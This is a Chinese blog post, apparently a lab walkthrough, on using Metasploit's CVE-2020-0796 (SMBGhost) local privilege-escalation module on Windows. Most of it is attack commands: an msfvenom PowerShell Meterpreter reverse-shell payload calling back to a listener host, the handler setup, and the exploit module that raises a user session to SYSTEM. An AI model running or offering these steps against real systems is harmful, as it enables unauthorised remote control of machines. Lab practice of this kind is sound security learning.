CVE-2020-0796的跟踪（二）

一直等CVE-2020-0796的远程利用拿反弹shell的PoC，到本周末也没等到，metasploit只出来个利用既有低权限shell提权到系统权限的PoC，cve_2020_0796_smbghost，鸡肋也是肉，实践一下吧，

首先得拿到一个低权限的shell，一开始我想到的是用nc，shell倒是能拿到，但是弄了半天发现无法转成meterpreter shell，cve_2020_0796_smbghost对普通shell又不work，没办法，只能改用powershell了，

先在metasploit下生成能反弹meterpreter shell的powershell文件，

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.137.100 LPORT=4444 -f psh-reflection >test.ps1，

把文件弄到靶机里，先别着急运行，因为metasploit这边的监听还没开，

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.137.100
run

这就可以去靶机上运行powershel文件了，顺利拿到meterpreter shell，查看用户权限，发现是普通用户，

下面就可以搞cve_2020_0796_smbghost了，

首先background，让shell session到后台去，然后sessions -l查看shell session的编号，

开始搞cve_2020_0796_smbghost，

use exploit/windows/local/cve_2020_0796_smbghost
set SESSION 1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.137.100
set LPORT 4445
run

能够拿到一个新的反弹meterpreter shell，再次查看用户权限，发现变成系统用户了，

还是那句话，远程利用拿反弹shell的PoC早晚出来，继续等，祝各位周末愉快。
